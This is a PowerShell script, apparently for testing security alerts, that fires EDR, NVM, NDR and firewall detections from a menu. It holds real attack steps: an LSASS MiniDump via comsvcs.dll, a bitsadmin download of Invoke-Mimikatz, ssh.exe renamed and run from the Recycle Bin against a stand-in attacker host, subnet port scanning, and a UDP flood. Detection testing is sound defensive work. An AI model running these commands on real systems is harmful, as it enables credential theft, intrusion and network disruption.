# Step one: Ensure we are running with elevated privileges
function Check-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if (-not (Check-Admin)) {
    Write-Host "Elevating privileges..." -ForegroundColor Yellow
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Define function to scan network
function Start-NetworkScan {
    param([string[]]$IPs)
    
    if ($IPs.Count -eq 0) {
        Write-Host "Skipping network scan due to missing IPs." -ForegroundColor Yellow
        return
    }
    
    $ports = @(21, 22, 23, 25, 80, 110, 443, 8000, 8008, 8888, 9000, 9009, 1337, 3398, 5800, 5900, 445, 1433)
    
    foreach ($ip in $IPs) {
        foreach ($port in $ports) {
            Write-Host "Scanning $ip on port $port..." -ForegroundColor Cyan
            Try {
                $socket = New-Object System.Net.Sockets.TcpClient
                $socket.SendTimeout = 500
                $socket.Connect($ip.Trim(), $port)
                if ($socket.Connected) {
                    Write-Host "$ip`:$port - TCP Port Open" -ForegroundColor Green
                }
                $socket.Close()
            } Catch {
                Write-Host "$ip`:$port - TCP Port Closed or Unreachable" -ForegroundColor Red
            }
        }
    }
}

# Define function to get active IPs from full subnet sequentially and run scan immediately
function Get-ActiveIPs {
    $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0").NextHop
    $nic = Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq (Get-NetRoute | Where-Object { $_.NextHop -eq $gateway }).InterfaceIndex -and $_.AddressFamily -eq 'IPv4' }
    
    if (-not $nic) {
        Write-Host "Error: Could not determine network interface. Continuing..." -ForegroundColor Yellow
        return @()
    }
    
    $ipParts = $nic.IPAddress -split '\.'
    if ($ipParts.Count -ne 4) {
        Write-Host "Error: Invalid IPv4 address format. Continuing..." -ForegroundColor Yellow
        return @()
    }
    
    $excludedLastOctet = [int]$ipParts[3]
    $ipRange = 2..254 | Where-Object { $_ -ne $excludedLastOctet }
    
    Write-Host "Pinging entire subnet sequentially to find active hosts and scanning immediately..." -ForegroundColor Cyan
    $activeIPs = @()
    
    foreach ($i in $ipRange) {
        $ip = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2]).$i"
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
            $activeIPs += $ip
            Start-NetworkScan -IPs @($ip) # Run scan immediately for each active host
        }
        if ($activeIPs.Count -ge 20) { break }
    }
    
    Write-Host "Active hosts found: $($activeIPs -join ', ')" -ForegroundColor Green
    return $activeIPs
}

# Function to trigger EDR alert
function Trigger-EDR {
    Write-Host "Triggering EDR alert..." -ForegroundColor Cyan
    Try{ 
        rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
        Start-Process -FilePath "bitsadmin" -WindowStyle Hidden -ArgumentList "/transfer Mimi https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1 $env:TEMP\Invoke-Mimikatz.ps1" -ErrorAction Stop
        
    } Catch {
        Write-Host "Mimi download failed. Continuing..." -ForegroundColor Yellow
    }
}

# Function to trigger NVM alert
function Trigger-NVM {
    Write-Host "Triggering NVM alert..." -ForegroundColor Cyan
    Try {
        Invoke-WebRequest -Uri 'https://www.cisco.com/content/dam/cisco-cdc/site/images/heroes/homepage/2025/nvidia-cisco-ai-2400x1028.jpg' -OutFile "$env:TEMP\Wallpaper.jpg"
        Remove-Item "$env:TEMP\Wallpaper.jpg"
        Set-Location -LiteralPath 'C:\`$Recycle.Bin\'
        if (Test-Path -Path ./metasploit) {
            Remove-Item -Path ./metasploit -Recurse
            }
        mkdir 'metasploit'
        cd 'metasploit'
        cp C:\Windows\System32\OpenSSH\ssh.exe .\ruby.exe
        
        .\ruby.exe badguy@phisher.nastydomain.com
      
   
    } Catch {
        Write-Host "NVM test failed. Continuing..." -ForegroundColor Yellow
    }
    
    $IPs = Get-ActiveIPs
    if ($IPs.Count -gt 0) {
        Start-NetworkScan -IPs $IPs
    } else {
        Write-Host "No active hosts found. Skipping network scan." -ForegroundColor Yellow
    }
}

# Function to trigger NDR alert
function Trigger-NDR {
    Try {
        1..9999 | ForEach-Object {
            $udpClient = New-Object System.Net.Sockets.UdpClient('75.75.75.75', 53)
            $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200)
            $udpClient.Send($data, $data.Length) | Out-Null
            Start-Sleep -Milliseconds 25
        }
    } Catch {
        Write-Host "NDR test failed. Continuing..." -ForegroundColor Yellow
    }
}

# Function to trigger Firewall alert
function Trigger-Firewall {
    Try {
        $randomIP = "$(Get-Random -Minimum 1 -Maximum 255).$(Get-Random -Minimum 1 -Maximum 255).$(Get-Random -Minimum 1 -Maximum 255).$(Get-Random -Minimum 1 -Maximum 255)"
        Invoke-WebRequest -Uri "http://$randomIP/sqlite3.pdf.vbs"
    } Catch {
        Write-Host "Firewall test failed. Continuing..." -ForegroundColor Yellow
    }
}

# Main menu
Write-Host "Choose an option:" -ForegroundColor Green
Write-Host "1) EDR trigger"
Write-Host "2) NVM trigger"
Write-Host "3) NDR trigger"
Write-Host "4) Firewall trigger"
Write-Host "5) ALL TRIGGERS"
$choice = Read-Host "Enter your choice (1-5) [Default: 5]"
if (-not $choice) { $choice = "5" }

switch ($choice) {
    "1" { Trigger-EDR }
    "2" { Trigger-NVM }
    "3" { Trigger-NDR }
    "4" { Trigger-Firewall }
    "5" {
        Trigger-EDR
        Trigger-NVM
        Trigger-NDR
        Trigger-Firewall
    }
    default {
        Write-Host "Invalid choice. Exiting." -ForegroundColor Red
    }
}

Write-Host "Scan and trigger execution complete." -ForegroundColor Green